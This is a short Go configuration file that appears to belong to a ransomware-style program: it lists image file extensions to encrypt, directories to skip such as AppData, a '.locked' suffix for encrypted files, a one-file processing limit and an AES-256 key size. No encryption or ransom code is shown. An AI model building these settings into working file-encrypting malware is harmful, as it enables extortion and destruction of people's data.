package common

// Extensions to encrypt
var Extensions = [...]string{
	"png",
	"jpg",
	"jpeg",
	"tif",
}

// IgnoreDirs will skip directories that contains the string
var IgnoreDirs = [...]string{
	"AppData",
	".",
}

const (
	// LockedExtension to append to file name when encrypted
	LockedExtension string = ".locked"

	// ProcessMax X files, then stop
	ProcessMax int = 1

	// KeySize in bytes (AES-256)
	KeySize int = 32
)
